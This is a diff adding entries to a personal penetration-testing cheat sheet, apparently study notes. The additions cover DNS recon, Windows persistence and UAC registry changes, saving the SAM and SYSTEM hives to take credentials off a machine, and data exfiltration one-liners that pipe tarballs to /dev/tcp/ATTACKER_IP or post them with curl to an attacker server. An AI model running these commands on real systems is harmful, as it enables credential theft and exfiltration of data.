@@ -1,5 +1,6 @@
 - [Net Sec](#net-sec)
   - [passive](#passive)
+      - [DNS](#dns)
     - [recon-ng](#recon-ng)
     - [Weaponization](#weaponization)
   - [active](#active)
@@ -26,7 +27,8 @@
 - [BASIC ENUM](#basic-enum)
   - [LINUX](#linux)
     - [Existing Tools](#existing-tools)
-  - [Windows](#windows)
+  - [Windows - Persistence](#windows---persistence)
+    - [User Account COntrol - UAC](#user-account-control---uac)
     - [DNS, SMB, SNMP](#dns-smb-snmp)
     - [External Tools](#external-tools)
 - [Web hacking](#web-hacking)
@@ -85,6 +87,10 @@
   - [How AV Works](#how-av-works)
 - [Empire (windows) / Starkiller](#empire-windows--starkiller)
   - [Hop Listener](#hop-listener)
+- [Data Exfiltration](#data-exfiltration)
+  - [TCP](#tcp)
+  - [SSH](#ssh-1)
+  - [HTTP](#http)
 
 
 # Net Sec
@@ -109,10 +115,12 @@
 - Maltego
   - graphical
 
-- DNS:
-  - shodan.io [check black friday - https://www.shodan.io/]
-  - https://viewdns.info/
-  - https://threatintelligenceplatform.com/
+#### DNS
+- shodan.io [check black friday - https://www.shodan.io/]
+- https://viewdns.info/
+- https://threatintelligenceplatform.com/
+- dig -x = reverse
+
 
 ### recon-ng
 - Workspace:
@@ -422,7 +430,7 @@
   - -ax/aux = comparable
   - -j = job format
 
-## Windows
+## Windows - Persistence
 - systeminfo
 - wmic
   - wmic qfe get Caption, Description = updates
@@ -436,7 +444,7 @@
 - whoami 
   - /priv
   - /groups
-- net 
+- net XXXXXX /add
   - user
   - group
   - localgroup [administrators]
@@ -451,7 +459,14 @@
   - -b binary connection
   - -n not resolving ip
   - -o PID
-  - 
+
+### User Account COntrol - UAC
+- Change policy
+  - reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+- Extract SAML files from machine (evilwin):
+  - reg save hklm\system system.bak
+  - reg save hklm\sam sam.vak
+  - downalod file.bak
 
 ### DNS, SMB, SNMP
 - dig
@@ -466,8 +481,8 @@
   - /opt/snmpcheck/snmpcheck.rb 10.10.84.238 -c COMMUNITY_STRING.
 
 
-
 ### External Tools
+ls
 
 - enum4linux IP_
 - metasploit (smb/enum || ssh/enum)
@@ -968,12 +983,11 @@ admin123' UNION SELECT SLEEP(5),2;--
 - netstat -noa
 - net start
 
-
 # Network assessment
 - Requirements: 
   - Number of machines
   - services running
-  - Publici interface?
+  - Public interface?
   - git server ?
   - public IP
 
@@ -1222,3 +1236,38 @@ admin123' UNION SELECT SLEEP(5),2;--
   - open port firewall
   - make sure we have the access to the target
   - use module to escalate privilege
+
+
+# Data Exfiltration
+- extract information
+- outbound traffic TCP/UDP 53 (DNO)
+
+- Bind9 server
+  - buy a domain (https://www.youtube.com/watch?v=p8wbebEgtDk)
+
+## TCP
+- easy to detect
+- listener on attacker: nc -lvp XXX > output.txt
+  
+- connecttion on victim:
+  - tar zfc - folder/ | base64 | dd conv=ebcdic > /dev/tcp/ATTAcKER_IP/PORT
+    - compress folder
+    - convert to base64
+    - convert and copy file, from ASCI du EBCDIC
+    - send to this Port
+- Received file
+  - dd conv=ascii if=received.file | base64 -d > file.tar
+
+## SSH
+- Connection on victim 
+  - tar cf - filder/ | ssh user@ip "cd /tmp/; tar xpf -"
+
+## HTTP
+- post request: not cached, not in browse, not bookmarked, no restriction on size
+- SEND: curl --data "files=$(tar zcf - FOLDR/ | base64)" http://attacker-server/file.php
+- RECEIVE: correct URL enconding
+
+
+- HTTPS
+  - https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04
+
